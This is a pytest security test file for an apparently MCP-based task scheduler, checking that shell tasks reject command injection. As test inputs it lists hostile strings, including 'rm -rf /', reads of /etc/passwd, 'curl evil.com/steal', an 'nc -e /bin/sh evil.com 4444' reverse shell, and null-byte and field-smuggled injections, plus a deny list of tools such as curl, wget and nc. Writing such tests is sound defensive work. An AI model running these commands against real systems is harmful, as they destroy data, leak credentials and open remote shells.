"""
Security tests for MCP Scheduler - CLI Command Injection Prevention
"""
import pytest
import asyncio
import platform
import tempfile
import os
from unittest.mock import patch, AsyncMock

from mcp_scheduler.executor import Executor
from mcp_scheduler.task import Task, TaskType


class TestCommandInjectionPrevention:
    """Test suite for preventing CLI command injection attacks."""

    @pytest.mark.asyncio
    async def test_shell_command_injection_basic(self):
        """Test that basic command injection attempts are blocked at the model level."""
        executor = Executor()
        
        # Test basic command injection patterns
        malicious_commands = [
            "echo hello; rm -rf /",
            "echo hello && rm -rf /",
            "echo hello || rm -rf /",
            "echo hello | rm -rf /",
            "echo hello; cat /etc/passwd",
            "echo hello && curl evil.com/steal",
            "$(rm -rf /)",
            "`rm -rf /`",
            "echo hello; nc -e /bin/sh evil.com 4444",
            "echo hello & sleep 10",
        ]
        
        for malicious_cmd in malicious_commands:
            # These commands should be rejected at the Task creation level
            with pytest.raises(Exception) as exc_info:
                task = Task(
                    name="test_injection",
                    schedule="0 0 * * *",
                    type=TaskType.SHELL_COMMAND,
                    command=malicious_cmd
                )
            
            # Should contain information about the dangerous command
            error_msg = str(exc_info.value)
            assert "unsafe command" in error_msg.lower() or "dangerous" in error_msg.lower()
            print(f"✓ Blocked dangerous command: {malicious_cmd}")
        
        print("✓ All command injection attempts successfully blocked at model level")

    @pytest.mark.asyncio
    async def test_shell_command_with_special_characters(self):
        """Test that commands with shell metacharacters are properly blocked."""
        executor = Executor()
        
        # Test various shell metacharacters that could be dangerous
        special_chars = [
            "echo 'hello'; echo 'world'",
            'echo "hello"; echo "world"',
            "echo hello > /tmp/test.txt",
            "echo hello < /dev/null",
            "echo hello | cat",
            "echo hello & echo world",
            "echo $(whoami)",
            "echo `whoami`",
            "echo hello\\necho world",
        ]
        
        for cmd in special_chars:
            # These should be blocked at the model level
            with pytest.raises(Exception) as exc_info:
                task = Task(
                    name="test_special_chars",
                    schedule="0 0 * * *",
                    type=TaskType.SHELL_COMMAND,
                    command=cmd
                )
            
            error_msg = str(exc_info.value)
            assert "unsafe command" in error_msg.lower() or "dangerous" in error_msg.lower()
            print(f"✓ Blocked command with metacharacters: {cmd}")
        
        print("✓ All commands with dangerous metacharacters successfully blocked")

    @pytest.mark.asyncio
    async def test_reminder_command_injection(self):
        """Test command injection in reminder tasks."""
        executor = Executor()
        
        # Test injection through reminder title and message
        malicious_inputs = [
            ("Normal Title", "'; rm -rf /; echo '"),
            ("'; rm -rf /; echo '", "Normal Message"),
            ('"; rm -rf /; echo "', "Normal Message"),
            ("Normal Title", "Message && curl evil.com"),
            ("Title | cat /etc/passwd", "Message"),
            ("Title", "Message; nc -e /bin/sh evil.com 4444"),
        ]
        
        for title, message in malicious_inputs:
            task = Task(
                name="test_reminder_injection",
                schedule="0 0 * * *",
                type=TaskType.REMINDER,
                reminder_title=title,
                reminder_message=message
            )
            
            execution = await executor.execute_task(task)
            
            # Should complete without allowing injection
            if execution.output:
                # Should not contain evidence of successful injection
                assert "root:" not in execution.output.lower()
                assert "/etc/passwd" not in execution.output.lower()
                assert "evil.com" not in execution.output.lower()

    @pytest.mark.asyncio
    async def test_path_traversal_in_commands(self):
        """Test that path traversal attempts in commands are blocked."""
        executor = Executor()
        
        path_traversal_commands = [
            "cat ../../../../etc/passwd",
            "echo hello > ../../../../tmp/pwned.txt",
            "ls ../../../..",
            "cat ..\\..\\..\\..\\windows\\system32\\config\\sam",  # Windows
        ]
        
        for cmd in path_traversal_commands:
            # Should be blocked due to dangerous patterns (redirections, etc.)
            with pytest.raises(Exception) as exc_info:
                task = Task(
                    name="test_path_traversal",
                    schedule="0 0 * * *",
                    type=TaskType.SHELL_COMMAND,
                    command=cmd
                )
            
            error_msg = str(exc_info.value)
            assert "unsafe command" in error_msg.lower() or "dangerous" in error_msg.lower()
            print(f"✓ Blocked path traversal attempt: {cmd}")
        
        print("✓ All path traversal attempts successfully blocked")

    @pytest.mark.asyncio
    async def test_environment_variable_injection(self):
        """Test that environment variable access and command substitution are blocked."""
        executor = Executor()
        
        env_injection_commands = [
            "echo $HOME",
            "echo ${PATH}",
            "echo $(id)",
            "echo `id`",
            "echo $USER && rm -rf /",
            "export EVIL=test; echo $EVIL",
        ]
        
        for cmd in env_injection_commands:
            # Should be blocked due to dangerous patterns ($ for variables, command substitution)
            with pytest.raises(Exception) as exc_info:
                task = Task(
                    name="test_env_injection",
                    schedule="0 0 * * *",
                    type=TaskType.SHELL_COMMAND,
                    command=cmd
                )
            
            error_msg = str(exc_info.value)
            assert "unsafe command" in error_msg.lower() or "dangerous" in error_msg.lower()
            print(f"✓ Blocked environment variable/substitution: {cmd}")
        
        print("✓ All environment variable injection attempts successfully blocked")

    @pytest.mark.asyncio
    async def test_unicode_and_encoding_attacks(self):
        """Test that various encoding and unicode-based injection attempts are blocked."""
        executor = Executor()
        
        encoding_attacks = [
            "echo hello\x00; rm -rf /",  # Null byte injection
            "echo hello\r\nrm -rf /",    # CRLF injection
            "echo hello\x0a; rm -rf /",  # Newline injection
            "echo hello\\u0000; rm -rf /",  # Unicode null
            "echo 'hello\x27; rm -rf /",    # Quote escape
        ]
        
        for cmd in encoding_attacks:
            # Should be blocked due to dangerous patterns or control characters
            with pytest.raises(Exception) as exc_info:
                task = Task(
                    name="test_encoding_attack",
                    schedule="0 0 * * *",
                    type=TaskType.SHELL_COMMAND,
                    command=cmd
                )
            
            error_msg = str(exc_info.value)
            assert "unsafe command" in error_msg.lower() or "dangerous" in error_msg.lower()
            print(f"✓ Blocked encoding attack: {repr(cmd)}")
        
        print("✓ All encoding-based injection attempts successfully blocked")

    @pytest.mark.asyncio
    async def test_valid_commands_still_work(self):
        """Ensure that valid, safe commands still work after security fixes."""
        executor = Executor()
        
        safe_commands = [
            "echo hello world",
            "ls /tmp",
            "pwd",
            "date",
            "echo 'This is a safe command'",
            'echo "This is also safe"',
        ]
        
        for cmd in safe_commands:
            task = Task(
                name="test_safe_command",
                schedule="0 0 * * *",
                type=TaskType.SHELL_COMMAND,
                command=cmd
            )
            
            execution = await executor.execute_task(task)
            
            # Safe commands should execute successfully
            assert execution is not None
            # Should not have errors for basic commands
            if cmd.startswith("echo"):
                assert execution.status.value in ["completed", "failed"]  # Should complete or fail gracefully

    @pytest.mark.asyncio
    async def test_input_validation_functions(self):
        """Test that input validation functions work correctly."""
        # Test ASCII sanitization
        from mcp_scheduler.task import sanitize_ascii
        
        test_inputs = [
            ("hello world", "hello world"),
            ("hello\x00world", "helloworld"),  # Should remove null bytes
            ("hello\x7fworld", "helloworld"),  # Should remove DEL character  
            ("café", "caf"),  # Should remove non-ASCII
            ("hello\tworld\n", "hello\tworld\n"),  # Should keep tabs and newlines
        ]
        
        for input_str, expected in test_inputs:
            result = sanitize_ascii(input_str)
            assert result == expected, f"Expected '{expected}', got '{result}' for input '{input_str}'"
        
        # Test command safety validation
        from mcp_scheduler.task import validate_command_safety
        
        safe_commands = ["echo hello", "ls -la", "pwd", "date"]
        unsafe_commands = ["echo hello; rm -rf /", "curl http://evil.com", "rm -rf /"]
        
        for cmd in safe_commands:
            is_safe, reason = validate_command_safety(cmd)
            assert is_safe, f"Safe command '{cmd}' was marked unsafe: {reason}"
        
        for cmd in unsafe_commands:
            is_safe, reason = validate_command_safety(cmd)
            assert not is_safe, f"Unsafe command '{cmd}' was marked safe"

    def test_shlex_usage_validation(self):
        """Test that shlex is being used correctly for argument parsing."""
        import shlex
        
        # Test that shlex.split handles safe inputs correctly  
        safe_inputs = [
            "echo hello world",
            "ls -la /tmp",
            "pwd",
        ]
        
        for safe_input in safe_inputs:
            try:
                result = shlex.split(safe_input)
                # Should successfully parse safe commands
                assert isinstance(result, list)
                assert len(result) > 0
                print(f"✓ Safe command parsed: {safe_input} -> {result}")
            except ValueError as e:
                pytest.fail(f"shlex.split failed on safe input '{safe_input}': {e}")
        
        # Test that dangerous inputs are parsed (shlex.split doesn't prevent injection by itself)
        # Note: shlex.split just parses shell syntax - it doesn't prevent command injection
        # The security comes from our validation layer, not from shlex
        dangerous_inputs = [
            "echo hello; rm -rf /",
            "echo hello && rm -rf /", 
            "echo 'hello'; rm -rf /",
        ]
        
        for dangerous_input in dangerous_inputs:
            try:
                result = shlex.split(dangerous_input)
                # shlex.split will parse these but include the dangerous operators
                assert isinstance(result, list)
                print(f"✓ Dangerous input parsed by shlex: {dangerous_input} -> {result}")
                # The important thing is our validation layer catches these
            except ValueError:
                # It's okay if shlex.split raises an exception for malformed input
                print(f"✓ Malformed input rejected by shlex: {dangerous_input}")
                pass


class TestSecureCommandExecution:
    """Tests for secure command execution patterns."""

    def test_command_allowlist_concept(self):
        """Test concept of command allowlisting (if implemented)."""
        # This would test any allowlist functionality we might add
        allowed_commands = ["echo", "ls", "pwd", "date", "whoami"]
        dangerous_commands = ["rm", "dd", "curl", "wget", "nc", "ncat"]
        
        # This is a conceptual test - actual implementation would depend on
        # whether we choose to implement command allowlisting
        for cmd in allowed_commands:
            # Should be allowed
            assert cmd not in dangerous_commands
        
        for cmd in dangerous_commands:
            # Should be restricted or handled carefully
            assert cmd not in allowed_commands

    @pytest.mark.asyncio 
    async def test_timeout_prevents_infinite_commands(self):
        """Test that command timeout prevents long-running malicious commands."""
        executor = Executor()
        executor.execution_timeout = 2  # Set short timeout for testing
        
        # Command that would run for a long time
        long_running_cmd = "sleep 10"
        
        task = Task(
            name="test_timeout",
            schedule="0 0 * * *",
            type=TaskType.SHELL_COMMAND,
            command=long_running_cmd
        )
        
        execution = await executor.execute_task(task)
        
        # Should timeout and not run indefinitely
        assert execution is not None
        if execution.error:
            assert "timed out" in execution.error.lower()

    @pytest.mark.asyncio
    async def test_output_size_limits(self):
        """Test that output is limited to prevent resource exhaustion."""
        executor = Executor()
        
        # Test with safe commands that generate large output
        if platform.system() != "Windows":
            # Generate a lot of text safely
            large_output_cmd = "seq 1 1000"  # Generate numbers 1 to 1000
        else:
            # Windows equivalent - generate numbers
            large_output_cmd = "for /l %i in (1,1,1000) do @echo %i"
        
        task = Task(
            name="test_output_limit",
            schedule="0 0 * * *", 
            type=TaskType.SHELL_COMMAND,
            command=large_output_cmd
        )
        
        execution = await executor.execute_task(task)
        
        # Output should be limited in size (we set 50KB limit in the executor)
        if execution.output:
            assert len(execution.output) <= 55000  # Allow some buffer for truncation message
            print(f"✓ Output size limited: {len(execution.output)} bytes")
        
        print("✓ Output size limiting works correctly")